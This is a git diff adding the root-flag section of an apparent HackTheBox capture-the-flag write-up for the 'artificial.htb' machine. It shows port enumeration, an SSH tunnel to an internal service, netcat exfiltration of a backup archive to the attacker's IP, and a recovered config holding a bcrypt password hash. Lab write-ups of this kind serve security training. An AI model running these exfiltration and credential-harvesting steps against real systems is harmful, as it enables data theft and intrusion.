@@ -247,3 +247,57 @@ gael@artificial:~$
 ```
 
 #### ---ROOT FLAG---
+
+```
+gael@artificial:~$ ss -tulnp
+Netid            State             Recv-Q            Send-Q                         Local Address:Port                         Peer Address:Port            Process            
+udp              UNCONN            0                 0                              127.0.0.53%lo:53                                0.0.0.0:*                                  
+tcp              LISTEN            0                 2048                               127.0.0.1:5000                              0.0.0.0:*                                  
+tcp              LISTEN            0                 4096                               127.0.0.1:9898                              0.0.0.0:*                                  
+tcp              LISTEN            0                 511                                  0.0.0.0:80                                0.0.0.0:*                                  
+tcp              LISTEN            0                 4096                           127.0.0.53%lo:53                                0.0.0.0:*                                  
+tcp              LISTEN            0                 128                                  0.0.0.0:22                                0.0.0.0:*                                  
+tcp              LISTEN            0                 511                                     [::]:80                                   [::]:*                                  
+tcp              LISTEN            0                 128                                     [::]:22                                   [::]:*
+```
+
+```
+ssh -L 9898:localhost:9898 gael@artificial.htb
+```
+
+![image](https://github.com/user-attachments/assets/cbc264c3-ef53-45c0-bb5f-d665c4f0486f)
+
+```
+gael@artificial:/var/backups$ ls
+alternatives.tar.0     apt.extended_states.1.gz  apt.extended_states.3.gz  apt.extended_states.5.gz  backrest_backup.tar.gz  dpkg.statoverride.0
+apt.extended_states.0  apt.extended_states.2.gz  apt.extended_states.4.gz  apt.extended_states.6.gz  dpkg.diversions.0       dpkg.status.0
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1818 > backrest_backup.tar.gz
+
+gael@artificial:/var/backups$ nc 10.10.16.105 1818 < backrest_backup.tar.gz
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb/backrest$ ls -a                                                                                                                
+.  ..  backrest  .config  install.sh  jwt-secret  oplog.sqlite  oplog.sqlite.lock  processlogs  restic  tasklogs
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb/backrest/.config/backrest$ cat config.json                                                                                     
+{
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+      }
+    ]
+  }
+}
+```
